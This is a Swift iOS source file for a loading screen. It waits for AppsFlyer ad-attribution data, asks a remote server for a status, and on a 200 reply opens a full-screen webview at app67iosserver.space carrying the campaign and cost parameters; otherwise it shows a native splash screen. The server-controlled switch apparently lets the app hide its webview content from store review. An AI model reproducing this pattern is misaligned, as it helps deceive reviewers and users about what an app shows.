import UIKit
import SwiftUI
import OneSignalFramework
import AppsFlyerLib

class LoadingSplash: UIViewController {

    let loadingLabel = UILabel()
    let loadingImage = UIImageView()

    private let activityIndicator: UIActivityIndicatorView = {
        let indicator = UIActivityIndicatorView(style: .large)
        indicator.color = .white
        indicator.translatesAutoresizingMaskIntoConstraints = false
        indicator.hidesWhenStopped = true
        return indicator
    }()
    
    override func viewDidLoad() {
        super.viewDidLoad()
        setupUI()
        setupFlow()
    }

    private func setupUI() {
        print("start setupUI")
        view.addSubview(loadingImage)
        loadingImage.image = UIImage(resource: .logo)

        view.addSubview(activityIndicator)
        
        loadingImage.translatesAutoresizingMaskIntoConstraints = false
        NSLayoutConstraint.activate([
            loadingImage.topAnchor.constraint(equalTo: view.topAnchor),
            loadingImage.leadingAnchor.constraint(equalTo: view.leadingAnchor),
            loadingImage.trailingAnchor.constraint(equalTo: view.trailingAnchor),
            loadingImage.bottomAnchor.constraint(equalTo: view.bottomAnchor),
            
            activityIndicator.centerXAnchor.constraint(equalTo: view.centerXAnchor),
            activityIndicator.centerYAnchor.constraint(equalTo: view.centerYAnchor)
        ])
    }

    private func setupFlow() {
        activityIndicator.startAnimating()

        if UserDefaults.standard.string(forKey: "finalAppsflyerURL") != nil {
            print("✅ Using existing AppsFlyer data")
            appsFlyerDataReady()
        } else {
            print("⌛ Waiting for AppsFlyer data...")

            NotificationCenter.default.addObserver(
                self,
                selector: #selector(appsFlyerDataReady),
                name: Notification.Name("AppsFlyerDataReceived"),
                object: nil
            )

            DispatchQueue.main.asyncAfter(deadline: .now() + 10) {
                if UserDefaults.standard.string(forKey: "finalAppsflyerURL") == nil {
                    print("⚠️ Timeout waiting for AppsFlyer. Proceeding with fallback.")
                    self.appsFlyerDataReady()
                }
            }
        }
    }

    @objc private func appsFlyerDataReady() {
        NotificationCenter.default.removeObserver(self, name: Notification.Name("AppsFlyerDataReceived"), object: nil)
        proceedWithFlow()
    }

    private func proceedWithFlow() {
        
        CheckURLService.checkURLStatus { is200 in
            DispatchQueue.main.async { [self] in
                if is200 {
                    if let appDelegate = UIApplication.shared.delegate as? AppDelegate {
                        appDelegate.restrictRotation = .all
                    }
                    let link = self.generateTrackingLink()
                    activityIndicator.stopAnimating()
                    let vc = WebviewVC(url: URL(string: link)!)
                    vc.modalPresentationStyle = .fullScreen
                    self.present(vc, animated: true)
                } else {
                    if let appDelegate = UIApplication.shared.delegate as? AppDelegate {
                        appDelegate.restrictRotation = .portrait
                    }
                    activityIndicator.stopAnimating()
                        let swiftUIView = SplashScreen()
                        let hostingController = UIHostingController(rootView: swiftUIView)
                        hostingController.modalPresentationStyle = .fullScreen
                        self.present(hostingController, animated: true)
                }
            }
        }
    }
    
    func generateTrackingLink() -> String {
        let base = "https://app67iosserver.space/29K9SD"
        if let savedURL = UserDefaults.standard.string(forKey: "finalAppsflyerURL") {
            return savedURL
        } else {
            print("⚠️ AppsFlyer data not available, returning base URL only")
            return base
        }
    }
}


extension AppDelegate: AppsFlyerLibDelegate {
    
    
    func onConversionDataSuccess(_ conversionInfo: [AnyHashable: Any]) {
        guard let data = conversionInfo as? [String: Any] else {
            print("❌ Failed to cast conversionInfo to [String: Any]")
            return
        }

        print("📦 AppsFlyer data received: \(data)")

        let appsflyerID = AppsFlyerLib.shared().getAppsFlyerUID()
        let afStatus = (data["af_status"] as? String)?.lowercased()
        let isOrganic = afStatus == "organic"

        let baseURL = "https://app67iosserver.space/29K9SD"
        var urlComponents = URLComponents(string: baseURL)!
        var queryItems: [URLQueryItem] = [
            URLQueryItem(name: "appsflyer_id", value: appsflyerID)
        ]

        if isOrganic {
            queryItems.append(URLQueryItem(name: "campaign", value: "organic"))
        } else {
            let rawCampaign = data["campaign"] as? String ?? ""

            let campaignParts = rawCampaign.split(separator: "_")
            for part in campaignParts {
                let keyValue = part.split(separator: "=", maxSplits: 1)
                if keyValue.count == 2 {
                    let key = String(keyValue[0])
                    let value = String(keyValue[1])
                    queryItems.append(URLQueryItem(name: key, value: value))
                }
            }

            let subParams: [String: String] = [
                "sub1": data["af_sub1"] as? String ?? "",
                "sub2": data["af_ad_type"] as? String ?? "",
                "sub3": data["af_cost_value"] as? String ?? "",
                "sub4": data["af_cost_currency"] as? String ?? "",
                "sub5": data["af_ad_id"] as? String ?? "",
                "sub6": data["af_siteid"] as? String ?? ""
            ]

            for (key, value) in subParams {
                queryItems.append(URLQueryItem(name: key, value: value))
            }
        }

        urlComponents.queryItems = queryItems

        let finalURL = urlComponents.url?.absoluteString ?? ""
        print("✅ Final URL: \(finalURL)")

        UserDefaults.standard.set(finalURL, forKey: "finalAppsflyerURL")
        NotificationCenter.default.post(name: Notification.Name("AppsFlyerDataReceived"), object: nil)
    }

    func onConversionDataFail(_ error: Error) {
        print("❌ Conversion data error: \(error.localizedDescription)")
    }
}
